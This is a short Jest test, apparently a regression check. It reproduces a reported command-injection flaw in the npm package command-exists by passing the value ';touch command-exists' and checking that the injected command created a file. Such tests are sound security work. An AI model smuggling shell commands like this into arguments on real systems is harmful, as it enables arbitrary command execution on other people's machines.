//https://hackerone.com/reports/324453
test("Command Injection in command-exists", () => {
  const commandExists = require("command-exists");
  const fs = require("fs");
  const path = "./command-exists";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  commandExists.sync(";touch command-exists");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
